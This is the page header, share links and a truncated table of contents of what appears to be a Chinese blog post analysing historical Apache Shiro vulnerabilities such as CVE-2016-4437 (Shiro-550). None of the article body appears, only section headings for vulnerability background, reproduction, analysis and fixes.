<!DOCTYPE html>
<html lang=zh>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="前言一篇早该完成的文章，中间因为一些事情断断续续补完。主要从源码分析截止25年初Apache Shiro的一些漏洞。 进度：    CVE ID 进度    CVE-2010-3863 √   CVE-2014-0074    CVE-2016-4437（Shiro-550） √   CVE-2016-6802 √   CVE-2019-12422（Shiro-721 √   CVE-2020-1">
<meta property="og:type" content="article">
<meta property="og:title" content="Shiro漏洞分析">
<meta property="og:url" content="http://example.com/2024/11/07/Shiro%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/index.html">
<meta property="og:site_name" content="cmisl_破站">
<meta property="og:description" content="前言一篇早该完成的文章，中间因为一些事情断断续续补完。主要从源码分析截止25年初Apache Shiro的一些漏洞。 进度：    CVE ID 进度    CVE-2010-3863 √   CVE-2014-0074    CVE-2016-4437（Shiro-550） √   CVE-2016-6802 √   CVE-2019-12422（Shiro-721 √   CVE-2020-1">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/ShiroFeatures.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241109030234509.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241109150817355.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241109160837114.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241109172730069.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241109173444914.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241109225015958.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241110010711879.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241110020033445.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241110025149268.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241110040841149.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241110041134055.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241110051141163.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241110051307654.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241116044713568.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241116045141943.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241116050848822.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241116051214288.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241116052014077.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241116053021719.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241111023900750.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241111024023954.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241111024156922.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241111132030159.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241111132102144.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241114102939433.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241116002949717.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241116002658631.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241116003630399.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241116004229344.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241117014158682.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241117131219878.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241117035942752.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241117045807847.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241117051212818.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241119123338381.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241119123424271.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241119124712189.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241119124907046.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241119150439820.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241119224725166.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241120020943374.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241120024802336.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241120125423748.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241120143803543.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241120144246681.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241120133216046.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241126105531023.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241126105638803.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241126105727729.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/1.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/2.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241126165747906.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241127035007553.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241127043650182.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241127052835569.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241127052857394.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241127054427712.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241127055429864.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241128023012576.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241128030514989.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241128030951980.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241129014025229.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241203024552726.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241203024620561.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241203025016956.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241203030601370.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241203032113622.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241203234429920.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241203234447535.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241204035757799.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241204040027613.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241204041459890.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241204043335155.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241204043603312.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241224023133929.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250111022347874.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250112000736935.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250112001020741.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250114221348699.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250114230841010.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250114232349617.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250115044458077.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250115044526191.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250115045107785.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250115154824127.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250115051728525.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250115051449803.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250115175203175.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250115175414023.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250115181807352.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250115182555132.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250115182914360.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250115214427647.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250124173002268.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250124173113608.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250124191334865.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250124200843806.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250125003939980.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250125043809329.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250125044230554.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250125154825868.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250125203410107.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250125205226572.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250126051411029.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250201221902014.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250201222252761.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250202002317401.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250202033823171.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250202040046717.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250202041757378.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250209211901462.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250209212942911.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250210030721721.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250210034750306.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250210043758604.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250210044530404.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250210190318841.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250210190450911.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250210210219407.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250210211242446.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250210211739965.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250211190857838.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250211191005212.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250212024016138.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250212032025667.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250212033053898.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250125154825868.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250125203410107.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250125205226572.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250126051411029.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250212043801674.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250212190745689.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250212190813515.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250213044349836.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250213044911556.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250213045439400.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250213045950638.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250213050049680.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250213050605754.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250213051655932.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250213051841749.png">
<meta property="article:published_time" content="2024-11-06T16:00:00.000Z">
<meta property="article:modified_time" content="2025-02-14T15:01:48.661Z">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/ShiroFeatures.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>Shiro漏洞分析</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 7.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">首页</a></li><!--
     --><!--
       --><li><a href="/about/">关于</a></li><!--
     --><!--
       --><li><a href="/archives/">归档</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="http://github.com/cmisl">项目</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="上一篇" href="/2025/02/14/CodeQL%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="下一篇" href="/2024/10/28/%E9%AB%98%E7%89%88%E6%9C%ACJDK%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81%E5%88%86%E6%9E%90/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">上一篇</span>
      <span id="i-next" class="info" style="display:none;">下一篇</span>
      <span id="i-top" class="info" style="display:none;">返回顶部</span>
      <span id="i-share" class="info" style="display:none;">分享文章</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/11/07/Shiro%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/11/07/Shiro%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&text=Shiro漏洞分析"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/11/07/Shiro%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=Shiro漏洞分析"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/11/07/Shiro%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&is_video=false&description=Shiro漏洞分析"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Shiro漏洞分析&body=Check out this article: http://example.com/2024/11/07/Shiro%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/11/07/Shiro%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=Shiro漏洞分析"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/11/07/Shiro%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=Shiro漏洞分析"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/11/07/Shiro%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=Shiro漏洞分析"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/11/07/Shiro%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=Shiro漏洞分析"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/11/07/Shiro%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&name=Shiro漏洞分析&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/11/07/Shiro%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&t=Shiro漏洞分析"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A1%86%E6%9E%B6%E7%AE%80%E4%BB%8B"><span class="toc-number">2.</span> <span class="toc-text">框架简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A1%86%E6%9E%B6%E6%B5%81%E7%A8%8B"><span class="toc-number">3.</span> <span class="toc-text">框架流程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9D%E5%A7%8B%E5%8C%96%E6%B5%81%E7%A8%8B"><span class="toc-number">3.1.</span> <span class="toc-text">初始化流程</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#userRealm"><span class="toc-number">3.1.1.</span> <span class="toc-text">userRealm</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#securityManager"><span class="toc-number">3.1.2.</span> <span class="toc-text">securityManager</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#shiroFilterFactoryBean"><span class="toc-number">3.1.3.</span> <span class="toc-text">shiroFilterFactoryBean</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E6%B5%81%E7%A8%8B"><span class="toc-number">3.2.</span> <span class="toc-text">过滤流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%99%BB%E5%BD%95%E6%B5%81%E7%A8%8B-%E4%B8%AA%E4%BA%BA%E8%A1%A5%E5%85%85"><span class="toc-number">3.3.</span> <span class="toc-text">登录流程(个人补充)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Shiro%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.</span> <span class="toc-text">Shiro历史漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2010-3863"><span class="toc-number">4.1.</span> <span class="toc-text">CVE-2010-3863</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%A1%E6%81%AF"><span class="toc-number">4.1.1.</span> <span class="toc-text">漏洞信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83"><span class="toc-number">4.1.2.</span> <span class="toc-text">漏洞环境</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">4.1.3.</span> <span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">4.1.4.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="toc-number">4.1.5.</span> <span class="toc-text">漏洞修复</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">4.1.6.</span> <span class="toc-text">参考链接</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2016-4437-Shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.2.</span> <span class="toc-text">CVE-2016-4437(Shiro-550反序列化漏洞)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%A1%E6%81%AF-1"><span class="toc-number">4.2.1.</span> <span class="toc-text">漏洞信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83-1"><span class="toc-number">4.2.2.</span> <span class="toc-text">漏洞环境</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">4.2.3.</span> <span class="toc-text">前置知识</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#RememberMeManager"><span class="toc-number">4.2.3.1.</span> <span class="toc-text">RememberMeManager</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#AbstractRememberMeManager"><span class="toc-number">4.2.3.2.</span> <span class="toc-text">AbstractRememberMeManager</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%B8%BB%E8%A6%81%E5%AD%97%E6%AE%B5"><span class="toc-number">4.2.3.2.1.</span> <span class="toc-text">主要字段</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E6%96%B9%E6%B3%95"><span class="toc-number">4.2.3.2.2.</span> <span class="toc-text">关键方法</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#CookieRememberMeManager"><span class="toc-number">4.2.3.3.</span> <span class="toc-text">CookieRememberMeManager</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E6%96%B9%E6%B3%95"><span class="toc-number">4.2.3.3.1.</span> <span class="toc-text">相关方法</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-1"><span class="toc-number">4.2.4.</span> <span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-1"><span class="toc-number">4.2.5.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98"><span class="toc-number">4.2.6.</span> <span class="toc-text">一些问题</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-1"><span class="toc-number">4.2.7.</span> <span class="toc-text">漏洞修复</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5-1"><span class="toc-number">4.2.8.</span> <span class="toc-text">参考链接</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2016-6802"><span class="toc-number">4.3.</span> <span class="toc-text">CVE-2016-6802</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%A1%E6%81%AF-2"><span class="toc-number">4.3.1.</span> <span 